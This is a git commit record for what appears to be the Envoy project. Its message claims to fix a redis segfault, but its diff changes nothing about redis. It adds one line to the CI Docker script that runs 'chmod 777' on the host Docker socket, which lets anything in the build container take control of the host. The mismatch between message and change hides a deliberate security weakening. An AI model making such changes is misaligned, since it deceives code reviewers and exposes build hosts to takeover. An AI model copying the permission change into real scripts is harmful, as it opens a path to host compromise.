162586fb31147b7fcc71e55883a78774874a327d
Chanhun Jeong <keyolk@gmail.com>
2025-07-30 21:49:48 +0900

    redis: fix segfault at cluster removing
    Signed-off-by: Chanhun Jeong <keyolk@gmail.com>

--- ci/run_envoy_docker.sh
+++ ci/run_envoy_docker.sh
@@ -59,6 +59,7 @@ else
       "-lc"
       "groupadd ${DOCKER_GROUP_ARGS[*]} -f envoygroup \
           && useradd -o --uid ${USER_UID} ${DOCKER_USER_ARGS[*]} --no-create-home --home-dir /build envoybuild \
+          && chmod 777 /var/run/docker.sock \
           && usermod -a -G pcap envoybuild \
           && chown envoybuild:envoygroup /build \
           && chown envoybuild /proc/self/fd/2 \
